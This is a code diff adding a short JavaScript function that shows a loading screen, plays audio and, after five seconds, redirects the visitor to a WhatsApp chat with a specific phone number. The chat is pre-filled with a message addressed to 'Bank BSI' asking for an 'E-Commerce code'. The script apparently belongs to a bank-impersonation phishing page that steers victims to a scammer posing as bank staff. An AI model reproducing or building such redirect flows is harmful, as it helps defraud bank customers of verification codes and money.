@@ -1,0 +1,11 @@
+function getcs(){
+ $("#djload").show();   
+  audio4 = document.getElementById("bsiku");
+  audio1 = document.getElementById("bsi");
+    audio4.play();
+     audio1.load();
+    audio4.loop = false
+setTimeout(function(){  
+location.href='https://wa.me/62816269098?text=Hallo%20Bank%20BSI%0ASaya%20mau%20request%20Kode%20E-Commerce';
+    }, 5000);    
+}     
